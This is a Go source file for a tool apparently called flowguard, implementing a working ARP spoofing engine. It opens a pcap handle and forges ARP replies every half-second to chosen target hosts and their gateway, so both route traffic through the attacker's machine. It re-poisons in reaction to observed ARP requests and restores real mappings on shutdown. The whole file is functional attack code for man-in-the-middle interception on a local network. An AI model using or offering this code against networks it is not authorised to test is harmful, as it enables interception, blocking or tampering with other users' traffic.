package core

import (
	"net"
	"sync"
	"time"

	"github.com/bugkey24/flowguard/internal/models"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type Spoofer struct {
	InterfaceName string
	MyMAC         net.HardwareAddr
	MyIP          net.IP
	GatewayIP     net.IP
	GatewayMAC    net.HardwareAddr
	
	Session       *models.SessionManager
	StopChan      chan struct{}
	stopOnce      sync.Once
	handle        *pcap.Handle
}

func NewSpoofer(iface string, myMAC net.HardwareAddr, myIP net.IP, gatewayIP net.IP, gatewayMAC net.HardwareAddr, session *models.SessionManager) *Spoofer {
	return &Spoofer{
		InterfaceName: iface,
		MyMAC:         myMAC,
		MyIP:          myIP,
		GatewayIP:     gatewayIP,
		GatewayMAC:    gatewayMAC,
		Session:       session,
		StopChan:      make(chan struct{}),
	}
}

func (s *Spoofer) Start() error {
	// Open Handle untuk Write & Read (Reactive)
	handle, err := pcap.OpenLive(s.InterfaceName, 65536, true, pcap.BlockForever)
	if err != nil { return err }
	s.handle = handle

	s.handle.SetBPFFilter("arp")

	// 1. TIME BASED SPOOFING (Routine check)
	ticker := time.NewTicker(500 * time.Millisecond)
	
	go func() {
		defer s.handle.Close()
		defer ticker.Stop()

		// Goroutine Reactive Listener
		go s.reactiveLoop()

		for {
			select {
			case <-s.StopChan:
				s.RestoreAll()
				return
			case <-ticker.C:
				// Burst Mode Standard
				targets := s.Session.GetAllTargets()
				for _, t := range targets {
					go func(target *models.TargetConfig) {
						s.sendPoison(target.IP, target.MAC, s.GatewayIP, s.MyMAC)
						s.sendPoison(s.GatewayIP, s.GatewayMAC, target.IP, s.MyMAC)
					}(t)
				}
			}
		}
	}()
	
	return nil
}

func (s *Spoofer) reactiveLoop() {
	src := gopacket.NewPacketSource(s.handle, layers.LayerTypeEthernet)
	in := src.Packets()

	for {
		select {
		case <-s.StopChan:
			return
		case packet, ok := <-in:
			if !ok { return }
			
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil { continue }
			arp, _ := arpLayer.(*layers.ARP)

			if arp.Operation != layers.ARPRequest { continue }

			reqIP := net.IP(arp.DstProtAddress)
			srcIP := net.IP(arp.SourceProtAddress)

			if reqIP.Equal(s.GatewayIP) {
				if t := s.findTargetByIP(srcIP); t != nil {
					s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
				}
			}

			if t := s.findTargetByIP(reqIP); t != nil {
				s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
			}
		}
	}
}

func (s *Spoofer) findTargetByIP(ip net.IP) *models.TargetConfig {
	targets := s.Session.GetAllTargets()
	for _, t := range targets {
		if t.IP.Equal(ip) {
			return t
		}
	}
	return nil
}

func (s *Spoofer) RestoreAll() {
	targets := s.Session.GetAllTargets()
	for i := 0; i < 3; i++ {
		for _, t := range targets {
			s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.GatewayMAC)
			s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, t.MAC)
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func (s *Spoofer) RestoreTarget(t *models.TargetConfig) {
	if s.handle == nil { return }
	for i := 0; i < 5; i++ {
		s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.GatewayMAC)
		s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, t.MAC)
		time.Sleep(20 * time.Millisecond)
	}
}

func (s *Spoofer) sendPoison(dstIP net.IP, dstMAC net.HardwareAddr, srcIP net.IP, srcMAC net.HardwareAddr) {
	if s.handle == nil { return }
	
	eth := layers.Ethernet{
		SrcMAC:       s.MyMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(srcIP),
		DstHwAddress:      dstMAC, 
		DstProtAddress:    []byte(dstIP),
	}

	buf := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buf, gopacket.SerializeOptions{}, &eth, &arp)
	// Ignore error
	_ = s.handle.WritePacketData(buf.Bytes())
}

func (s *Spoofer) Stop() {
	s.stopOnce.Do(func() { close(s.StopChan) })
}